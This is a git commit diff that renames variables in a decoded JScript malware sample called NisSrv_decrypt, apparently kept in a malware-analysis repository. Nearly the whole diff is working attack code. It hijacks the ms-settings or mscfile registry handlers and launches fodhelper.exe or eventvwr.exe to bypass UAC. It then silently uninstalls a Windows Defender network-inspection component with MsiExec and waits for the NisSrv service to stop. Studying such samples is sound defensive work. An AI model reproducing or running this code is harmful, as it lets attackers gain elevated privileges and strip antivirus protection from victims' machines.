9112b8fa6d01c6f339ff811b7d2af3d32179386a
a0zhar <96749372+a0zhar@users.noreply.github.com>
2023-04-16 19:09:50 +0200

    renamed variables to make code more understandable

--- WindowsAV/NisSrv_decrypt(Decoded).js
+++ WindowsAV/NisSrv_decrypt(Decoded).js
@@ -1,80 +1,79 @@
-function pmbskuecyftru(name) {
-  var winmgmts_object = GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_Service WHERE Name=+name+");
-  utlxfzud = new Enumerator(winmgmts_object);
-  bqijutotpzpmc = utlxfzud.item();
-  var process_state = "";
-  try {
-    process_state = bqijutotpzpmc.State;
-  } catch (e) {}
-  return (process_state == "Running") ? true : false;
-  
+function isServiceRunning(serviceName) {
+    var winmgmtsObject = GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_Service WHERE Name=+serviceName+");
+    var utlxfzud = new Enumerator(winmgmtsObject);
+    var bqijutotpzpmc = utlxfzud.item();
+    var processState = "";
+    try {
+        processState = bqijutotpzpmc.State;
+    } catch (e) {}
+    return (processState == "Running") ? true : false;
 }
-  NisSrv_lbl = "NisSrv";
-  var wScriptShell_application = WScript.CreateObject("shell.application");
-  var activeXObj_shell = new ActiveXObject("WScript.Shell");
-  var get_obj_winmgmtsCIMV2 = GetObject("winmgmts:\\\\.\\root\\CIMV2");
-  var lsiicx = get_obj_winmgmtsCIMV2.ExecQuery(
+
+var nisSrvLbl = "NisSrv";
+var wScriptShellApplication = WScript.CreateObject("shell.application");
+var activeXObjectShell = new ActiveXObject("WScript.Shell");
+var getObjWinmgmtsCIMV2 = GetObject("winmgmts:\\\\.\\root\\CIMV2");
+var lsiicx = getObjWinmgmtsCIMV2.ExecQuery(
     "SELECT * FROM Win32_OperatingSystem",
     "WQL",
     48
-  );
-  var zynhqkeg = new Enumerator(lsiicx);
-  var enum_item = zynhqkeg.item();
-  var sysDirObj = enum_item.SystemDirectory;
-  var versionObj = enum_item.Version;
-  var arr = versionObj.split(".");
-  if (arr[0] == "10") {
-    activeXObj_shell.RegWrite(
-      "HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\",
-      "MsiExec.exe /X{2AA3C13E-0531-41B8-AE48-AE28C940A809} ACCEPT=YES /qr+ /quiet",
-      "REG_SZ"
-    );
-    activeXObj_shell.RegWrite(
-      "HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\DelegateExecute",
-      "",
-      "REG_SZ"
-    );
-    wScriptShell_application.ShellExecute(
-      "explorer.exe",
-      +sysDirObj+"fodhelper.exe",
-      "",
-      "open",
-      0
-    );
-    WScript.sleep(1e4);
-    activeXObj_shell.RegDelete(
-      "HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\"
-    );
-  } else {
-    if (arr[0] == "6") {
-      activeXObj_shell.RegWrite(
-        "HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\\",
+);
+var zynhqkeg = new Enumerator(lsiicx);
+var enumItem = zynhqkeg.item();
+var sysDirObj = enumItem.SystemDirectory;
+var versionObj = enumItem.Version;
+var arr = versionObj.split(".");
+if (arr[0] == "10") {
+    activeXObjectShell.RegWrite(
+        "HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\",
         "MsiExec.exe /X{2AA3C13E-0531-41B8-AE48-AE28C940A809} ACCEPT=YES /qr+ /quiet",
         "REG_SZ"
-      );
-      wScriptShell_application.ShellExecute(
+    );
+    activeXObjectShell.RegWrite(
+        "HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\DelegateExecute",
+        "",
+        "REG_SZ"
+    );
+    wScriptShellApplication.ShellExecute(
         "explorer.exe",
-        +sysDirObj+"\\eventvwr.exe",
+        sysDirObj + "fodhelper.exe",
         "",
         "open",
         0
-      );
-      WScript.sleep(1e4);
-      activeXObj_shell.RegDelete(
-        "HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\\"
-      );
+    );
+    WScript.sleep(1e4);
+    activeXObjectShell.RegDelete(
+        "HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\"
+    );
+} else {
+    if (arr[0] == "6") {
+        activeXObjectShell.RegWrite(
+            "HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\\",
+            "MsiExec.exe /X{2AA3C13E-0531-41B8-AE48-AE28C940A809} ACCEPT=YES /qr+ /quiet",
+            "REG_SZ"
+        );
+        wScriptShellApplication.ShellExecute(
+            "explorer.exe",
+            sysDirObj + "\\eventvwr.exe",
+            "",
+            "open",
+            0
+        );
+        WScript.sleep(1e4);
+        activeXObjectShell.RegDelete(
+            "HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\\"
+        );
     }
-  }
-  var iii = 0;
-  while (true) {
-    if (pmbskuecyftru(NisSrv_lbl)) {
-      WScript.sleep(100);
+}
+var iii = 0;
+while (true) {
+    if (isServiceRunning(nisSrvLbl)) {
+        WScript.sleep(100);
     } else {
-      break;
+        break;
     }
     iii = iii + 1;
     if (iii == 900) {
-      break;
+        break;
     }
-  }
 }
